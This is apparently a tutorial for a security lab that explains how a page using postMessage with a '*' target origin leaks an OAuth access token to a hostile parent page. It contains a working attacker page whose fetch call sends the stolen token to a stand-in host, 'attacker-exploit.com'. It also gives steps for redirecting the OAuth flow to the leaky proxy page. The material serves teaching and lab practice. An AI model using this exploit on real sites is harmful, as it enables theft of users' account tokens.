PostMessage enable us to bypass `SOP` restrictions. So you can read the content of other page using iframe from other domain.

To make this crystal clear, let's look at a concrete example with two specific pages.

In this scenario:
- **Page 1 (The Victim Site):** Contains the data (the token in the URL).
- **Page 2 (The Attacker Site):** Wants to steal that data.
---
### Step 1: The Victim Site (Page 1)
**URL:** `https://victim.com/proxy#token=12345`

This page is designed to talk to its parent. It doesn't know who its parent is, so it just "shouts" the data out.

```html
<script>
    // This page grabs its own URL (including the #token)
    var myData = window.location.href;
    // It sends the data to its 'parent' (the window that contains the iframe)
    // The '*' means: "I'll give this to any parent, even a malicious one."
    parent.postMessage(myData, '*');
</script>
```

---
### Step 2: The Attacker Site (Page 2)

**URL:** `https://attacker-exploit.com`

This page creates an iframe to load Page 1 and sets up a "receiver" to catch the shout.
```html
<script>
    // 1. We create a listener. We are 'listening' for the shout.
    window.addEventListener("message", function(event) {
        // 'event.data' will contain "https://victim.com/proxy#token=12345"
        console.log("I stole the data: " + event.data);
        
        // 2. We send the stolen data to our own server logs
        fetch("https://attacker-exploit.com/log?data=" + event.data);
    }, false);
</script>

<iframe src="https://victim.com/proxy#token=12345" style="display:none;"></iframe>
```

---
### How the Communication Flows

1. **The Containment:** Page 2 (Attacker) loads Page 1 (Victim) inside an `<iframe>`.    
2. **The Execution:** Page 1 runs its script. It looks for its `parent`. In this case, the `parent` is Page 2.
3. **The Delivery:** Page 1 executes `postMessage`. It pushes the URL string across the "border" between `victim.com` and `attacker-exploit.com`.
4. **The Capture:** Because Page 2 has an `addEventListener("message", ...)`, it catches the string. The browser allows this because Page 1 explicitly said `postMessage` was okay.
### Why is this an OAuth vulnerability?

In your lab, you aren't just loading `https://victim.com/proxy#token=12345` manually. You are tricking the **OAuth Authorization Server** into doing the work for you.

1. You send the victim to the Google/OAuth login.    
2. In the `redirect_uri`, you put `https://victim.com/proxy`.
3. The OAuth server sends the user back to that Proxy page with the `#access_token=...` attached.
4. The Proxy page (Page 1) immediately "shouts" that URL to you (Page 2).    
### Summary Checklist for your Lab
- **The Proxy:** Is the page that has the `parent.postMessage(..., '*')` code.
- **Your Task:** Create an exploit page that:
    1. Listens for a "message".
    2. Iframes the OAuth URL, but changes the `redirect_uri` to point to that Proxy page.
